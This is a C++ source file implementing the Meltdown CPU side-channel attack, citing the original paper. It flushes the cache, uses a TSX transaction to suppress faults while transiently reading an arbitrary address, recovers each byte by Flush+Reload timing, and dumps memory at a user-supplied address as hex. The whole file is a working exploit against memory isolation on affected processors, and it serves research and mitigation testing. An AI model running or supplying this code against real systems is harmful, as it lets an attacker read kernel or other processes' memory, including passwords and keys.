//=============================================================================
// See also:
//   - https://meltdownattack.com/meltdown.pdf
//   - https://gcc.gnu.org/onlinedocs/gcc-4.9.0/gcc/X86-transactional-memory-intrinsics.html
// Build:
//   c++ meltdown.cpp -std=c++14 -Wall -mrtm -o meltdown
//
//=============================================================================

#include <vector>
#include <array>
#include <iostream>
#include <iomanip>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <immintrin.h>

const size_t kNumSamples = 3;

// assume memory pages of 4096 or 2^12 bytes
const size_t kPageSizeExp = 12;
const size_t kPageSize = 1 << kPageSizeExp;

inline
void
flush_from_cache(char const* address) {
  asm __volatile__ (
    "mfence             \n"
    "clflush 0(%0)      \n"
    :
    : "r" (address)
    :
  );
}

// This is the core of the meltdown attack. The function performs the transient
// instruction sequence of listing 2, page 8. It uses a memory transaction to
// supress the exception as described in the paper.
inline
void
leak(size_t address, char * buffer) {
  for (size_t j = 0; j < 256; ++j) {
    flush_from_cache(&buffer[j * kPageSize]);
  }

  unsigned int status;
  if ((status = _xbegin()) == _XBEGIN_STARTED) {
    asm __volatile__ (
      "retry%=:                           \n"
      "xorq %%rax, %%rax                  \n"
      "movb (%[address]), %%al            \n"
      "shlq %[exponent], %%rax            \n"
      "jz retry%=                         \n"
      "movq (%[buffer], %%rax, 1), %%rbx  \n"
      :
      : [address]  "r" (address),
        [buffer]   "r" (buffer),
        [exponent] "J" (kPageSizeExp)
      : "%rax", "%rbx"
    );
    _xend();
  } else {
    asm __volatile__ ("mfence\n" :::);
  }
}

// This function returns the number of cycles required to access a given
// address. It is the receiving end of the meltdown covert channel. 
// See https://eprint.iacr.org/2013/448.pdf figure 4 on page 5.
inline
size_t
probe_access_time(char const* address) {
  volatile size_t time;

  asm __volatile__ (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    "clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (address)
    : "%esi", "%edx"
  );
  return time;
}

inline
unsigned char
sample_byte(size_t address, char * buffer) {
  std::array<unsigned char, 256> scores{};
  std::array<size_t, 256> access_times;
  size_t best = 0;
  
  for (size_t i = 0; i < kNumSamples; ++i) {
    access_times.fill(0);

    leak(address, buffer);

    for (size_t j = 0; j < 256; ++j) {
      access_times[j] = probe_access_time(&buffer[j * kPageSize]);
    }

    for (size_t j = 0; j < 256; ++j) {
      best = access_times[best] > access_times[j] ? j : best;
    }

    scores[best]++;
  }

  for (size_t j = 0; j < 256; ++j) {
    best = scores[j] > scores[best] ? j : best;
  }
  return (unsigned char)best;
}

template <typename Buffer>
void
pretty_print(size_t address, Buffer const& buffer) {
  std::ios_base::fmtflags flags = std::cout.flags();
  std::streamsize precision = std::cout.precision();
  char fill = std::cout.fill();
  std::string ascii;
  std::cout << std::hex << std::internal << std::setfill('0')
            << "0x" << std::setw(16) << address << " | ";
  for (size_t i = 0; i < buffer.size(); ++i) {
    std::cout << std::setw(2) << (int)buffer[i] << ((i + 1) == 8 ? "  " : " ");
    ascii += (buffer[i] >= ' ' && buffer[i] <= '~') ? buffer[i] : '.';
  }
  std::cout << "| " << ascii << std::endl;
  
  std::cout.flags(flags);
  std::cout.precision(precision);
  std::cout.fill(fill);
}

int
main(int argc, char* argv[]) {
  static const char * usage = "usage: meltdown <address> <length>\nDanke Intel!\n";
  size_t begin = (size_t)usage;
  size_t size = strlen(usage);

  std::array<char, 256 * kPageSize> probe_memory;

  if (argc != 3) {
    // leak our own usage message
    for (size_t i = 0; i < size; ++i) {
      std::cerr << sample_byte(begin + i, probe_memory.data());
    }
    return EXIT_FAILURE;
  }

  begin = strtoul(argv[1], nullptr, 16);
  size = strtoul(argv[2], nullptr, 10);

  std::vector<unsigned char> buffer;
  size_t address;
  for (size_t i = 0; i < size; ++i) {
    if (buffer.empty()) {
      address = begin + i;
    }
    buffer.push_back(sample_byte(begin + i, probe_memory.data()));
    if (buffer.size() == 16) {
      pretty_print(address, buffer);
      buffer.clear();
    }
  }
  if (!buffer.empty()) {
    pretty_print(address, buffer);
    buffer.clear();
  }

  return EXIT_SUCCESS;
}
